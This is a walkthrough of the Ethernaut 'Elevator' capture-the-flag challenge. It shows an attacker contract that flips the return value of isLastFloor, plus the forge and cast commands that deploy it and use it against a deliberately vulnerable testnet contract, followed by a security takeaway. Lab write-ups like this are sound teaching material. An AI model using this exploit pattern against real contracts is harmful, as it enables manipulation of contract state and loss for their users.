# Ethernaut Challenge 11 — Elevator

This elevator won't let you reach the top of your building. Right?

Instance address:

```
0xFee3bd70D1313ef9ea54EDdfC9cbDcA3ce5cf003
````

---

## 🎯 Goal

Reach the top floor by setting `top = true`.

---

## 🧠 Thought process

Let's inspect the contract:

```solidity
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
        floor = _floor;
        top = building.isLastFloor(floor);
    }
}
````

Key observations:

* the contract casts `msg.sender` to the `Building` interface
* it assumes that `isLastFloor()` behaves correctly
* it calls `isLastFloor()` **twice**

👉 There is no guarantee that:

* `msg.sender` is a trusted contract
* `isLastFloor()` returns consistent results

---

### 💥 The vulnerability

The contract trusts an external contract (`msg.sender`) for logic.

This allows us to:

* return `false` on the first call → pass the `if`
* return `true` on the second call → set `top = true`

---

## 🧪 Step 1 — Inspect current state

Define a variable:

```bash
ELEVATOR_SEPOLIA=0xFee3bd70D1313ef9ea54EDdfC9cbDcA3ce5cf003
```

Check `floor`:

```bash
cast call $ELEVATOR_SEPOLIA \
    "floor()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0
```

Check `top`:

```bash
cast call $ELEVATOR_SEPOLIA \
    "top()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
false
```

---

## 🧪 Step 2 — Build attacker contract

I created `ElevatorAttacker.sol` to exploit the vulnerability.

The idea is to **flip the return value** of `isLastFloor()`:

```solidity
function isLastFloor(uint256) external returns (bool) {
    bool result = s_flip;
    s_flip = !s_flip;
    return result;
}
```

So:

* first call → `false`
* second call → `true`

---

## 🧪 Step 3 — Local testing

I tested the exploit locally in [ElevatorTest.t.sol](../../test/challenge-11-elevator/ElevatorTest.t.sol).

The test:

* deploys `Elevator`
* deploys `ElevatorAttacker`
* calls `attack()`
* verifies the call does not revert

This confirms the exploit works before deploying on Sepolia.

---

## 🚀 Step 4 — Deploy attacker contract

```bash
forge create src/challenge-11-elevator/ElevatorAttacker.sol:ElevatorAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $ELEVATOR_SEPOLIA
```

Deployed address:

```
0x10860FCC9677e006637205b22FEA80f2A71C1D7A
```

Save it:

```bash
ELEVATOR_ATTACKER_SEPOLIA=0x10860FCC9677e006637205b22FEA80f2A71C1D7A
```

---

## 🚀 Step 5 — Execute the attack

```bash
cast send $ELEVATOR_ATTACKER_SEPOLIA \
    "attack()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```
0x23b47faf2d0ba53c9a2550cbcdc09fae37adada8036d118d8d1042cde7c5cecf
```

---

## ✅ Step 6 — Verify the result

Check `top` again:

```bash
cast call $ELEVATOR_SEPOLIA \
    "top()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
true
```

The challenge is completed.

---

## 🛡️ Security takeaway

This challenge highlights a common mistake:

* never trust external contracts for critical logic
* interfaces are just assumptions, not guarantees
* external calls can return inconsistent results

👉 A contract should never rely on another contract to enforce its internal invariants

---



